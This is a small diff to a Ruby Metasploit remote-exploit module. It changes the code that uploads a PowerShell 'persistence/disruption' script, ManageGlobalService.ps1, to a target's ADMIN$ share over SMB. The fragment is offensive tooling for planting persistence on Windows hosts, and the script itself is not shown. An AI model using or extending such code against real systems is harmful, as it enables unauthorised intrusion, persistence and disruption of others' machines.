@@ -155,7 +155,8 @@ class MetasploitModule < Msf::Exploit::Remote
       remote_path = 'Windows\\ManageGlobalService.ps1'
       script_data = persistence_script
 
-      tree = @client.tree_connect(share)
+      print_status("Uploading persistence/disruption script to ADMIN$ share...")
+      tree = smb_client.tree_connect(share)
       file = tree.open_file(remote_path, 'rwct', '0', '0', '0')
       file.write(script_data)
       file.close
